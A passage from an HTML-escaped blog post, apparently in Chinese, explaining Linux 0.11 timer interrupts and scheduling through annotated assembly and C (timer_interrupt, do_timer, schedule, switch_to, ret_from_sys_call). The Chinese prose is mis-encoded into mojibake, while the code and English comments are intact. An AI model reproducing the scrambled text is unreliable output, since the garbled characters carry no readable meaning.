src=\"https://ws2.sinaimg.cn/large/006tNbRwgy1fw51zkvo2nj313q0mm3z3.jpg\"\u003e\nCopied from IntelÂ® 64 and IA-32 Architectures Software Developerâ€™s Manual\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eæ¯ä¸€ä¸ªä¸­æ–­æè¿°ç¬¦é¡¹éƒ½å°†æ˜¯ä»»åŠ¡é—¨ï¼Œä¸­æ–­é—¨ï¼Œé™·é˜±é—¨ä¸‰ç±»ä¸­çš„ä¸€ç±»ï¼Œå…¶æ‰€å ç”¨çš„ 8 å­—èŠ‚æ•°æ®å°†æŒ‰å¦‚ä¸‹çš„å½¢å¼è¿›è¡Œå­˜å‚¨\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg src=\"https://ws2.sinaimg.cn/large/006tNbRwgy1fw527o8903j314614ita0.jpg\"\u003e\nCopied from IntelÂ® 64 and IA-32 Architectures Software Developerâ€™s Manual\u003c/p\u003e\n\u003col start=\"4\"\u003e\n\u003cli\u003eæ—¶é’Ÿä¸­æ–­æ˜¯ä¸€ç§ä¸­æ–­é—¨ï¼Œå¯ä»¥çœ‹åˆ°ä½ 0~15 ä½å’Œé«˜ 48~63 ä½å…±åŒç»„æˆäº†æ®µå†…åç§»é‡ï¼Œè€Œä½16~31ä½ç»„æˆäº†ä¸€ä¸ªæ®µé€‰æ‹©ç¬¦(å¯ä»¥å» GDT æ‰¾åˆ°ç›¸åº”çš„æ®µ)ã€‚\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg src=\"https://ws3.sinaimg.cn/large/006tNbRwgy1fw52a4jbe0j31440zeq3j.jpg\"\u003e\nCopied from IntelÂ® 64 and IA-32 Architectures Software Developerâ€™s Manual\u003c/p\u003e\n\u003col start=\"5\"\u003e\n\u003cli\u003eè‡³æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®šä½åˆ°å¤„ç†æ—¶é’Ÿä¸­æ–­çš„ä»£ç ç©¶ç«Ÿåœ¨å‘¢ã€‚ä¹‹åä¹Ÿå°±æ˜¯æ™®é€šçš„ CPU ç»§ç»­æ‰§è¡ŒæŒ‡ä»¤çš„è¿‡ç¨‹(å½“ç„¶ï¼Œéœ€è¦æ³¨æ„ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦æ³¨æ„å½“å‰æ®µé€‰æ‹©ç¬¦æ‰€è¡¨ç¤ºçš„ DPL=0 ï¼Œå³å·²ç»è¿›å…¥äº†å†…æ ¸æ€)\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eæ¨¡æ¿å¼çš„ä¿å­˜ç°åœº timer_interrupt\u003c/h3\u003e\n\u003cp\u003eåœ¨ä¸Šä¸€å°èŠ‚ç¬¬ 5 æ­¥å®šä½æ—¶é’Ÿä¸­æ–­çš„ä»£ç æ—¶ï¼Œç”±äºå‘ç”Ÿäº†ç‰¹æƒçº§çš„åˆ‡æ¢ï¼Œå› æ­¤ä¸­æ–­å¤„ç†æµç¨‹ä¼šè‡ªåŠ¨åœ°åœ¨æ–°çš„æ ˆ(è¿™é‡ŒæŒ‡å¤„ç†æ—¶é’Ÿä¸­æ–­ä½¿ç”¨çš„å†…æ ¸æ ˆ)ä¸­ä¿å­˜åŸæ¥ä»»åŠ¡çš„ä¿¡æ¯ï¼Œä¾æ¬¡å…¥æ–°æ ˆçš„æ•°æ®æœ‰åŸä»»åŠ¡çš„ SS, ESP, EFLAGS, CS, EIP, (Error Code) ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åå°†æ­£å¼è¿›å…¥åˆ° IDT å®šä½çš„æ—¶é’Ÿä¸­æ–­å¤„ç†é€»è¾‘çš„å¼€å§‹ä½ç½® (å½“ç„¶äº†ï¼Œåˆ°è¿™é‡Œä¹Ÿè¿˜æ˜¯åœ¨ä¿å­˜ç°åœºã€‚æ¯•ç«Ÿè¿˜æœ‰å¥½å¤šå¯„å­˜å™¨çš„æ•°æ®è¦ä¿å­˜çš„)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003e.align 4\n_timer_interrupt:\n    push %ds        # save ds,es and put kernel data space\n    push %es        # into them. %fs is used by _system_call\n    push %fs\n    pushl %edx      # we save %eax,%ecx,%edx as gcc doesn't\n    pushl %ecx      # save those across function calls. %ebx\n    pushl %ebx      # is saved as we use that in ret_sys_call\n    pushl %eax\n    movl $0x10,%eax # 0x10 æ˜¯å†…æ ¸æ•°æ®æ®µé€‰æ‹©ç¬¦ï¼Œå³ GDT ç¬¬äºŒé¡¹\n    mov %ax,%ds\n    mov %ax,%es\n    movl $0x17,%eax # 0x17 æ˜¯å½“å‰ä»»åŠ¡æ•°æ®æ®µé€‰æ‹©ç¬¦ï¼ŒLDT ç¬¬äºŒé¡¹ (åŒºåˆ†é€‰æ‹©ç¬¦æ˜¯ä½¿ç”¨ GDT or LDT ï¼Œçœ‹ val \u0026#x26; 0x4 çš„ç»“æœï¼Œå¦‚æœä¸º 1 ä½¿ç”¨ LDTï¼Œå¦åˆ™ GDT\n    mov %ax,%fs\n    incl _jiffies   # åæ­£æ¯æ¬¡æ—¶é’Ÿä¸­æ–­ +1 ï¼Œæƒ³ä¸åˆ°åˆé€‚çš„ä¸­æ–‡ç¿»è¯‘\n    movb $0x20,%al      # EOI to interrupt controller #1 å‘é€æŒ‡ä»¤è¯·æ±‚ç¡¬ä»¶ç»“æŸè¿™æ¬¡æ—¶é’Ÿä¸­æ–­çš„æŠ¥å‘Š\n    outb %al,$0x20\n    movl CS(%esp),%eax  # è¿™ä¸ª CS æ˜¯ä¸ªå¸¸é‡ï¼Œå–å‡ºå†…æ ¸æ ˆæš‚å­˜çš„åŸæ¥æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡çš„ä»£ç æ®µé€‰æ‹©ç¬¦\n    andl $3,%eax        # %eax is CPL (0 or 3, 0=supervisor)    åˆ¤æ–­ä¸€ä¸‹åœ¨ä¸­æ–­å¼€å§‹å‰ä»£ç çš„ç‰¹æƒçº§ 0 æ˜¯å†…æ ¸æ€ï¼Œ3 æ˜¯ç”¨æˆ·æ€\n    pushl %eax\n    call _do_timer      # è°ƒç”¨ do_timer(long CPL) ã€‚çœŸæ­£çš„å¤„ç†æ—¶é’Ÿä¸­æ–­\n    addl $4,%esp        # task switching to accounting ...\n    jmp ret_from_sys_call\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eä»»åŠ¡è°ƒåº¦ do_timer\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003evoid do_timer(long cpl)     /* è¿™ä¸ª cpl æ˜¯ä¸Šä¸€å°èŠ‚è·å–çš„åŸä»»åŠ¡æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤çš„ç‰¹æƒçº§ */\n{\n    extern int beepcount;       /* æ‰¬å£°å™¨å‘å£°è®¡æ•° */\n    extern void sysbeepstop(void);  /* å…³é—­æ‰¬å£°å™¨çš„å‡½æ•°å£°æ˜ */\n\n    if (beepcount)              /* è¿™æ®µé€»è¾‘ä½œç”¨å¾ˆä¸æ¸…æ™°ï¼Œå¯èƒ½æ˜¯å¯Œæœ‰å¹´ä»£æ„Ÿçš„äº§ç‰© */\n        if (!--beepcount)\n            sysbeepstop();\n\n    if (cpl)                    /* åˆ¤æ–­ç‰¹æƒçº§ ç„¶åç»™å½“å‰ä»»åŠ¡çš„ç”¨æˆ·æ€/å†…æ ¸æ€ç”¨æ—¶è®¡æ•° */\n        current-\u003eutime++;\n    else\n        current-\u003estime++;\n\n    /* è¿™æ®µé€»è¾‘æ˜¯ç»™æ“ä½œç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç”¨çš„ï¼Œç”¨å…´è¶£çš„æ¬¢è¿è‡ªå·±å­¦ä¹  */\n    if (next_timer) {\n        next_timer-\u003ejiffies--;\n        while (next_timer \u0026#x26;\u0026#x26; next_timer-\u003ejiffies \u0026#x3C;= 0) {\n            void (*fn)(void);\n\n            fn = next_timer-\u003efn;\n            next_timer-\u003efn = ((void *) 0);\n            next_timer = next_timer-\u003enext;\n            (fn)();\n        }\n    }\n    if (current_DOR \u0026#x26; 0xf0)\n        do_floppy_timer();\n    if ((--current-\u003ecounter)\u003e0) return;     /* åˆ†é…ç»™å½“å‰ä»»åŠ¡çš„æ—¶é—´ç‰‡ -1 ã€‚å¦‚æœä¸ä¸º0ï¼Œé‚£ä¹ˆç›´æ¥é€€å‡ºæ—¶é’Ÿä¸­æ–­ï¼Œè®©ä»»åŠ¡ç»§ç»­æ‰§è¡Œ */\n    current-\u003ecounter=0;     /* å¦åˆ™ï¼Œå½“å‰ä»»åŠ¡çš„æ—¶é—´ç‰‡è®°ä¸º 0 */\n    if (!cpl) return;       /* å¦‚æœå½“å‰ä»»åŠ¡æ­£å¤„äºå†…æ ¸æ€(æ¯”å¦‚ç”¨æˆ·ç¨‹åºä¸­ä½¿ç”¨äº†ä¸€äº›ç³»ç»Ÿè°ƒç”¨)ï¼Œé‚£ä¹ˆå…ˆè®©è¿™ä¸ªä»»åŠ¡ç»§ç»­æ‰§è¡Œï¼Œé¿å…ä»»åŠ¡åˆ‡æ¢å¼•èµ·çš„éº»çƒ¦ */\n    schedule();             /* ä»»åŠ¡è°ƒç”¨ï¼Œå†³å®šä¸‹ä¸€ä¸ªæ—¶é—´ç‰‡çš„ä¸»äºº */\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eä»»åŠ¡è°ƒåº¦ schedule()\u003c/h3\u003e\n\u003cp\u003eschedule() å°±å¼€å§‹å¯¹ CPU ä¹‹åè¦æŠŠæ—¶é—´ç‰‡åˆ†é…ç»™å“ªä¸ªä»»åŠ¡åšä¸€æ¬¡å†³ç­–äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œåœ¨å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦å…ˆäº†è§£ä¸€ä¸‹ç»“æ„ä½“ task_struct \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estruct task_struct {\n    long state; /* -1 unrunnable, 0 runnable, \u003e0 stopped */\n    long counter;\n    long priority;\n    long signal;\n    struct sigaction sigaction[32];\n    long blocked;   /* bitmap of masked signals */\n/* various fields */\n    int exit_code;\n    unsigned long start_code,end_code,end_data,brk,start_stack;\n    long pid,father,pgrp,session,leader;\n    unsigned short uid,euid,suid;\n    unsigned short gid,egid,sgid;\n    long alarm;\n    long utime,stime,cutime,cstime,start_time;\n    unsigned short used_math;\n/* file system info */\n    int tty;        /* -1 if no tty, so it must be signed */\n    unsigned short umask;\n    struct m_inode * pwd;\n    struct m_inode * root;\n    struct m_inode * executable;\n    unsigned long close_on_exec;\n    struct file * filp[NR_OPEN];\n/* ldt for this task 0 - zero 1 - cs 2 - ds\u0026#x26;ss */\n    struct desc_struct ldt[3];\n/* tss for this task */\n    struct tss_struct tss;\n};\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eåŒ†åŒ†ä¸€ç¥ï¼Œä¸è¿‡æ˜¯ä¸æ˜¯è§‰å¾—æœ‰äº›å˜é‡åè¿˜æ˜¯å¾ˆç†Ÿæ‚‰çš„ï¼Œæ¯”å¦‚è¯´ priority, utime, uid, eid, gid ç­‰ç­‰ã€‚\nä½†æ˜¯æš‚æ—¶è¿˜ç”¨ä¸ä¸Šè¿™ä¹ˆå¤šã€‚åªè¦æœ‰ä¸ªæ¦‚å¿µå°±å¥½ã€‚æ“ä½œç³»ç»Ÿé€šè¿‡ä¸Šè¿°è¿™äº›å€¼å…±åŒç»´æŠ¤èµ·äº†ä¸€ä¸ªä»»åŠ¡çš„æ–¹æ–¹é¢é¢çš„ä¿¡æ¯ã€‚\u003c/p\u003e\n\u003cp\u003eå…¶ä¸­ï¼Œéœ€è¦å†æ¬¡æ³¨æ„çš„æ˜¯ï¼ŒLinux0.11 ç‰ˆæœ¬æœ€å¤šåªæ”¯æŒ 64 ä¸ªä»»åŠ¡ (è¿™æ˜¯ç¡¬ç¼–ç å†³å®šçš„ä¸Šé™ï¼Œå› ä¸ºè¿™ä¸ª task_struct ç»“æ„å®ä¾‹åªå£°æ˜äº† 64 ä¸ª)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e/*\n *  'schedule()' is the scheduler function. This is GOOD CODE! There\n * probably won't be any reason to change this, as it should work well\n * in all circumstances (ie gives IO-bound processes good response etc).\n * The one thing you might take a look at is the signal-handler code here.\n *\n *   NOTE!!  Task 0 is the 'idle' task, which gets called when no other\n * tasks can run. It can not be killed, and it cannot sleep. The 'state'\n * information in task[0] is never used.\n */\nvoid schedule(void)\n{\n    int i,next,c;\n    struct task_struct ** p;\n\n/* check alarm, wake up any interruptible tasks that have got a signal */\n/* æ£€æµ‹ alarm (ä»»åŠ¡å®šæ—¶æŠ¥è­¦ä¿¡å·)ï¼Œå¹¶å”¤é†’å¯ä¸­æ–­çš„ä»»åŠ¡æ¥å®Œæˆé¢„å®šä¹‰çš„å·¥ä½œ, å¥½åƒè‡ªå·±ç”¨å¾—å°‘ï¼Œè¿˜ä¸å¤ªäº†è§£ alarm(xxx) çš„ç»†èŠ‚\n * ä»ä»»åŠ¡ 63 å·å¼€å§‹(æ€»å…± 64 ä¸ªä»»åŠ¡, 0~63) ï¼Œå€’ç€éå†æ‰€æœ‰ä»»åŠ¡ï¼Œæ£€æµ‹ alarm \n */\n    for(p = \u0026#x26;LAST_TASK ; p \u003e \u0026#x26;FIRST_TASK ; --p)\n        if (*p) {\n            if ((*p)-\u003ealarm \u0026#x26;\u0026#x26; (*p)-\u003ealarm \u0026#x3C; jiffies) {\n                    (*p)-\u003esignal |= (1\u0026#x3C;\u0026#x3C;(SIGALRM-1));\n                    (*p)-\u003ealarm = 0;\n                }\n            if (((*p)-\u003esignal \u0026#x26; ~(_BLOCKABLE \u0026#x26; (*p)-\u003eblocked)) \u0026#x26;\u0026#x26;\n            (*p)-\u003estate==TASK_INTERRUPTIBLE)\n                (*p)-\u003estate=TASK_RUNNING;\n        }\n\n/* this is the scheduler proper: */\n\n    while (1) {\n        c = -1;\n        next = 0;\n        i = NR_TASKS;   /* è¿™é‡Œçš„å® NR_TASKS = 64 */\n        p = \u0026#x26;task[NR_TASKS];\n        while (--i) {\n            if (!*--p)\n                continue;\n            /* é€‰æ‹©ä»»åŠ¡çŠ¶æ€ä¸º å°±ç»ªæ€ï¼Œä¸” counter å€¼æœ€å¤§çš„ä»»åŠ¡å·ä½œä¸ºä¸‹ä¸€ä¸ªå ç”¨ CPU çš„ä»»åŠ¡\n            if ((*p)-\u003estate == TASK_RUNNING \u0026#x26;\u0026#x26; (*p)-\u003ecounter \u003e c) \n                c = (*p)-\u003ecounter, next = i;\n        }\n        /* å¦‚æœæ²¡æœ‰å…¶å®ƒä»»åŠ¡ï¼Œé‚£ä¹ˆ next = 0 ï¼Œå³æ¥ä¸‹æ¥å ç”¨ cpu çš„ä»»åŠ¡å°±æ˜¯ 0å·ä»»åŠ¡(0å·ä»»åŠ¡ä¸€å®šå­˜åœ¨ï¼Œä¸èƒ½è¢« kill ) */\n        if (c) break;\n        /* å¦‚æœ 1~63 å·ä»»åŠ¡(ä¸å­˜åœ¨æˆ–ä¸åœ¨å°±ç»ªæ€)è‡³å°‘å­˜åœ¨ä¸€ä¸ªä»»åŠ¡ï¼Œä¸”æ—¶é—´ç‰‡éƒ½ä¸º 0 ï¼Œé‚£ä¹ˆé‡æ–°è®¡ç®—åˆ†é…ç»™æ¯ä¸ªä»»åŠ¡çš„ counter å€¼ */\n        for(p = \u0026#x26;LAST_TASK ; p \u003e \u0026#x26;FIRST_TASK ; --p)\n            if (*p)\n                (*p)-\u003ecounter = ((*p)-\u003ecounter \u003e\u003e 1) + (*p)-\u003epriority;\n    }\n    /* å°†å½“å‰ä»»åŠ¡åˆ‡æ¢ä¸º next ï¼Œç„¶åå°±å¯ä»¥ä¸€åˆ‡å°±ç»ªï¼Œé€€å‡ºæ—¶é’Ÿä¸­æ–­ï¼Œå°±å˜æˆæ–°çš„å ç”¨cpuçš„ä»»åŠ¡æ¥æ‰§è¡Œäº† */\n    switch_to(next);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eswitch_to(next)\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eswitch_to(next) è¿™ä¸ªå‡½æ•°ï¼Œæ˜¯é€šè¿‡å†…åµŒæ±‡ç¼–å†™çš„ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹ç»†èŠ‚(è¿™é‡Œé€‰ç”¨ GCC ç¼–è¯‘å‡ºæ¥çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œä¸ç›´æ¥ä½¿ç”¨å†…åµŒæ±‡ç¼–)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-assembly\"\u003e# è¿™é‡Œçš„æ±‡ç¼–æŒ‡ä»¤ç´§è·Ÿåœ¨ if(c) break; ä¹‹å\n.L36:\n    movl    %ebx, %edx          # è¿™é‡Œ ebx å­˜å‚¨çš„æ˜¯ next å˜é‡çš„å€¼ï¼Œç°åœ¨å¤åˆ¶åˆ° edx ä¸Š\n    sall    $4, %edx            # sallã€addl ä¸¤è¡Œçš„ç›®çš„æ˜¯è®¡ç®—å¾—åˆ°ä¸€ä¸ª TSS é€‰æ‹©ç¬¦ï¼ŒTSS0 åœ¨ GDT æ˜¯ç¬¬4é¡¹ï¼ŒTSS1 åœ¨ GDT æ˜¯ç¬¬ 6 é¡¹ï¼Œç±»æ¨...å…¶ä¸­é€‰æ‹©ç¬¦å3ä½ä¸ºDPLå’Œ GDTR/LDTR é€‰é¡¹\n    addl    $32, %edx\n    movl    _task(,%ebx,4), %ecx    # æ‰¾åˆ° next å·ä»»åŠ¡çš„ task_struct çš„æŒ‡é’ˆ (å­˜å‚¨åœ¨ task[64] çš„æ•°ç»„ä¸­)\n#APP\n# 141 \"sched.c\" 1\n    cmpl %ecx,_current          # ç¡®è®¤æ˜¯ä¸æ˜¯åŸä»»åŠ¡\n    je 1f                       # æ˜¯çš„è¯ç›´æ¥è·³å‡º (è·³åˆ°æœ€è¿‘çš„æ ‡ç­¾ 1 )\n    movw %dx,8(%esp)\n    xchgl %ecx,_current         # äº¤æ¢ ecx å’Œ _current å­˜å‚¨çš„å€¼\n    ljmp 4(%esp)                # é€šè¿‡é—´æ¥è·³è½¬å®Œæˆä»»åŠ¡åˆ‡æ¢ã€‚é€šç”¨çš„å½¢å¼æ˜¯ jmp CS:IPï¼Œä½†æ˜¯ä½¿ç”¨é—´æ¥è·³è½¬ï¼Œåœ¨å†…å­˜ä¸­çš„å€¼å…ˆè¯»å– 32 ä½åç§»é‡ï¼Œå†è¯» 16 ä½æ®µé€‰æ‹©ç¬¦\n    cmpl %ecx,_last_task_used_math\n    jne 1f\n    clts                        # æ¸…é™¤ CR0 å¯„å­˜å™¨ä¸­çš„ TS Flag \n1:\n# 0 \"\" 2\n#NO_AP\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eä¸Šé¢è¿™æ®µç¨‹åºæœ‰å¿…è¦å°†å®ƒå‰²è£‚æˆä¸¤éƒ¨åˆ†æ¥çœ‹å¾…ï¼Œä»¥ \u003ccode\u003eljmp 4(%esp)\u003c/code\u003e ä¸ºç•Œã€‚\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ejmp\u003c/code\u003e ï¼Œè¿™æ˜¯ä¸€ä¸ªç›¸å½“æ˜æ˜¾çš„ç¨‹åºè·³è½¬ã€‚è¿™é‡Œ jmp ç»™å‡ºçš„é€‰æ‹©ç¬¦æ˜¯ GDT ä¸ŠæŸä¸ªä»»åŠ¡çš„ TSS æè¿°ç¬¦\u003c/p\u003e\n\u003cp\u003eé€šè¿‡ \u003ccode\u003ejmp\u003c/code\u003e CPU å°†å®Œæˆè€çš„ä»»åŠ¡æ‰€æœ‰å¯„å­˜å™¨çš„ä¿å­˜ç°åœºï¼Œä»¥åŠæ–°çš„ä»»åŠ¡æ‰€æœ‰å¯„å­˜å™¨æš‚å­˜ç»“æœçš„è½½å…¥ã€‚\u003c/p\u003e\n\u003cp\u003eCPU æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå°†æ˜¯æ–°çš„ä»»åŠ¡ CS:EIP æ‰€æŒ‡æ˜çš„æŒ‡ä»¤ã€‚\u003c/p\u003e\n\u003cp\u003eç›¸åº”çš„ï¼Œ\u003ccode\u003eljmp\u003c/code\u003e ä¹‹åçš„æŒ‡ä»¤å°†åœ¨è¯¥ä»»åŠ¡é‡æ–°è·å¾—å ç”¨ CPU åè·å¾—æ‰§è¡Œã€‚\u003c/p\u003e\n\u003ch2\u003eä»»åŠ¡è°ƒåº¦çš„ç»“æŸé˜¶æ®µ\u003c/h2\u003e\n\u003cp\u003eè¿™æ®µå°±æ¯”è¾ƒç»•äº†ï¼Œç°åœ¨å‡è®¾ä¸€ä¸ªå‰æï¼Œå°±æ˜¯ä»»åŠ¡ A ä¹Ÿæ˜¯åœ¨æ—¶é’Ÿä¸­æ–­é‡æ–°è¿›è¡Œä»»åŠ¡è°ƒåº¦çš„æ—¶å€™è¢«æ›¿æ¢æ‰çš„ï¼Œç°åœ¨ CPU åˆ†é…çš„æ—¶é—´ç‰‡åˆè½®åˆ°äº†ä»»åŠ¡ A ã€‚\u003c/p\u003e\n\u003cp\u003eä¹Ÿå°±æ˜¯ç´§éšç€ä¸Šä¸€å°èŠ‚ \u003ccode\u003eljmp\u003c/code\u003e çœ‹çœ‹ä»ä»»åŠ¡å†…æ ¸æ€å›åˆ°ç”¨æˆ·æ€çš„æµç¨‹ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-asm\"\u003e    # è¿™æ®µä¸ä¸Šé¢ä¸€æ®µæŒ‡ä»¤æ˜¯ç›´æ¥æ‰¿æ¥çš„\n    movl    12(%esp), %eax\n    xorl    %gs:20, %eax\n    je  .L40\n    call    ___stack_chk_fail\n.L40:\n    addl    $24, %esp           # è¿™é‡Œè¿”è¿˜è¿™æ¬¡ call é¢å¤–ç”³è¯·çš„å†…æ ¸æ ˆç©ºé—´\n    .cfi_def_cfa_offset 8\n    popl    %ebx                # æ¢å¤è¿›å…¥ call çš„æ—¶å€™æš‚å­˜çš„ ebx\n    .cfi_restore 3\n    .cfi_def_cfa_offset 4\n    ret                         # return è·³è½¬å›åˆ°å½“åˆè°ƒç”¨çš„åœ°æ–¹\n    .cfi_endproc\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eè¿˜æ˜¯ä»æ±‡ç¼–æŒ‡ä»¤æ¥çœ‹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-asm\"\u003e    call    _schedule           # åŸå…ˆè°ƒç”¨ schedule() çš„åœ°æ–¹\n.L93:\n    # return è·³è½¬å›æ¥ï¼Œç›´æ¥æ‰¿æ¥çš„æŒ‡ä»¤\n    addl    $8, %esp\n    .cfi_def_cfa_offset 8\n    popl    %ebx\n    .cfi_restore 3\n    .cfi_def_cfa_offset 4\n    ret                         # ç»§ç»­ return ï¼Œè·³å‡º do_timer() \n    .cfi_endproc\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"language-asm\"\u003e    call _do_timer      # 'do_timer(long CPL)' does everything from\n    addl $4,%esp        # task switching to accounting ...\n    jmp ret_from_sys_call\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eret_from_sys_call\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œå°±æ‰“ç®—æ­£å¼ç»“æŸç”±äºè¿™æ¬¡æ—¶é’Ÿä¸­æ–­æ‰€å¼•å‘çš„å†…æ ¸æ€æŒ‡ä»¤æ‰§è¡Œçš„æµç¨‹ï¼Œæ­£å¼å›å½’ç”¨æˆ·æ€äº†ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-asm\"\u003eret_from_sys_call:\n    # è¿™ 3 è¡Œæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯ä»»åŠ¡0ï¼Œå¦‚æœæ˜¯å°±ä¸è¿›è¡Œä¿¡å·é‡çš„å¤„ç†äº†\n    movl _current,%eax      # task[0] cannot have signals\n    cmpl _task,%eax\n    je 3f\n    # åˆ¤æ–­åœ¨å‘ç”Ÿæ—¶é’Ÿä¸­æ–­å‰ï¼ŒCS è¡¨ç¤ºçš„æ˜¯ä¸æ˜¯ LDT ç¬¬ 1 é¡¹ (å±€éƒ¨å˜é‡è¡¨çš„ä»£ç æ®µ)\n    # å¦åˆ™ CS å°±åº”è¯¥å†…æ ¸æ€ä»£ç æ®µäº†ï¼Œä¸è¿›è¡Œä¿¡å·é‡å¤„ç†\n    cmpw $0x0f,CS(%esp)     # was old code segment supervisor ?\n    jne 3f\n    # åˆ¤æ–­åœ¨å‘ç”Ÿæ—¶é’Ÿä¸­æ–­å‰ï¼ŒSS è¡¨ç¤ºçš„æ˜¯ä¸æ˜¯ LDT ç¬¬ 2 é¡¹ (å±€éƒ¨å˜é‡è¡¨çš„æ•°æ®æ®µ)\n    # å¦åˆ™è®¤ä¸ºç¨‹åºè¿˜å¤„åœ¨å†…æ ¸æ€ï¼Œä¸è¿›è¡Œä¿¡å·é‡å¤„ç†\n    cmpw $0x17,OLDSS(%esp)      # was stack segment = 0x17 ?\n    jne 3f\n    # è®¾ç½®ä¿¡å·é‡ (ä¸æ¸…æ¥šï¼Œå…ˆæŒ–ä¸ªå‘)\n    movl signal(%eax),%ebx\n    movl blocked(%eax),%ecx\n    notl %ecx\n    andl %ebx,%ecx\n    bsfl %ecx,%ecx\n    je 3f\n    btrl %ecx,%ebx\n    movl %ebx,signal(%eax)\n    incl %ecx\n    pushl %ecx\n    call _do_signal\n    popl %eax\n3:  popl %eax\n    popl %ebx\n    popl %ecx\n    popl %edx\n    pop %fs\n    pop %es\n    pop %ds\n    iret\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eè‡³æ­¤ï¼Œé€šè¿‡ iret å°†è·³è½¬å›åˆ°ç”¨æˆ·æ€ä»£ç è¢«ä¸­æ–­çš„ä½ç½®ï¼Œå¹¶ç»§ç»­æ‰§è¡Œ\u003c/p\u003e\n\u003ch2\u003eè¡¥å……\u003c/h2\u003e\n\u003ch3\u003epause()\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://dormouse-none.github.io/2018-10-06-understand-Kernel-3/\"\u003eLinux Kernel(3) - æ“ä½œç³»ç»Ÿå¯åŠ¨\u003c/a\u003e ä¸­ï¼Œæè¿°è¿‡ä»»åŠ¡0åœ¨å®Œæˆäº†æ•´ä¸ªæ“ä½œç³»ç»Ÿçš„å¯åŠ¨æµç¨‹ä¹‹åï¼Œå”¯ä¸€åœ¨åšçš„äº‹æƒ…ï¼Œå°±æ˜¯è°ƒç”¨ \u003ccode\u003efor(;;) pause();\u003c/code\u003e \u003c/p\u003e\n\u003cp\u003eCPU æ¯æ¬¡æŠŠæ—¶é—´ç‰‡åˆ†é…ç»™å®ƒï¼Œå®ƒå°±å¼€å§‹æµªè´¹æƒåŠ›ï¼Œç›´æ¥ä¸è¦äº†è¿™ä¸ªæ—¶é—´ç‰‡ã€‚\u003c/p\u003e\n\u003cp\u003eä¹‹å‰ä¸€ç›´ä»¥ä¸º pause() ä¼šé€‰æ‹©æ‰§è¡Œ \u003ccode\u003eHLT\u003c/code\u003e æŒ‡ä»¤è®© CPU æš‚æ—¶åœ°é™·å…¥åœæ­¢çŠ¶æ€ã€‚ä½†æ˜¯å‡ºä¹æ„æ–™ï¼Œå¹¶ä¸æ˜¯è¿™ä¸ªç»“æœ(å½“ç„¶ï¼Œæœ€ç»ˆæ˜¯ä¸æ˜¯è¿˜æ˜¯å¦ä¸€ä¸ªè¯´æ³•ã€‚æ¯•ç«Ÿä»£ç éƒ½æ˜¯äººå†™çš„ï¼Œæ¯ä¸ªäººéƒ½å¯ä»¥å„è‡ªæœ‰ä¸€å¥—å®ç°)ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ CPU æŠŠæ‰§è¡ŒæŒ‡ä»¤çš„æƒåŠ›äº¤ä¸ªä»»åŠ¡ 0 æ—¶ï¼Œé€‰æ‹©è®© CPU åœæ­¢ï¼Œç›´åˆ°æ¥æ”¶åˆ°ç¡¬ä»¶ä¸­æ–­ä¸ºæ­¢ä¹Ÿä¸å¤±ä¸ºä¸€ç§é€‰æ‹©ã€‚å½“ç„¶ï¼Œä¸è®ºå…¶å®ƒï¼ŒLinux0.11ç‰ˆæœ¬çš„ä»£ç ä¸æ˜¯è¿™æ ·çš„ã€‚\u003c/p\u003e\n\u003cp\u003eé€šè¿‡ \u003ccode\u003eINT 0x80\u003c/code\u003e é…åˆç³»ç»Ÿè°ƒç”¨å‡½æ•°æŸ¥è¡¨ï¼Œæœ€åå®šä½åˆ°çš„å°±æ˜¯ sys_pause() äº†\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e_sys_pause:\n.LFB13:\n    .cfi_startproc\n    subl    $12, %esp\n    .cfi_def_cfa_offset 16\n    movl    _current, %eax\n    movl    $1, (%eax)\n    call    _schedule       # è°ƒç”¨ schedule() é‡æ–°åˆ’åˆ†æ—¶é—´ç‰‡\n    movl    $0, %eax\n    addl    $12, %esp\n    .cfi_def_cfa_offset 4\n    ret\n    .cfi_endproc\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003etimer å®šæ—¶å™¨\u003c/h3\u003e\n\u003cp\u003eä¹‹å‰åœ¨ 